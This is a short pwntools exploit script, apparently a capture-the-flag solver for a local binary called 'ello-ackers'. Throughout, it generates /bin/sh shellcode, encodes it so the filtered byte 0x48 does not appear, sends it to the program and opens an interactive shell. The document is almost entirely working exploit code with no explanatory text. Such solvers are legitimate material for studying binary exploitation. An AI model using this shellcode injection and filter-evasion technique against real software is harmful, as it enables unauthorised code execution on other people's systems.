from pwn import *

# ==========================================
# CONFIGURATION
# ==========================================

BINARY = "./ello-ackers"

context.binary = ELF(BINARY, checksec=False)
context.arch = context.binary.arch
context.log_level = "info"

elf = context.binary

# ==========================================
# CONNECTION
# ==========================================

io = process(BINARY)

# ==========================================
# EXPLOIT / SOLVER
# ==========================================

def exploit(io):
	
	raw_shellcode = asm(shellcraft.sh())
	
	filtered_char = b"\x48"
	
	encode_shellcode = encode(raw_shellcode, avoid=filtered_char)
	
	print(encode_shellcode)
	io.recvuntil(b" ")
	io.send(encode_shellcode)


# ==========================================
# MAIN
# ==========================================

def main():

    exploit(io)

    io.interactive()


if __name__ == "__main__":
    main()
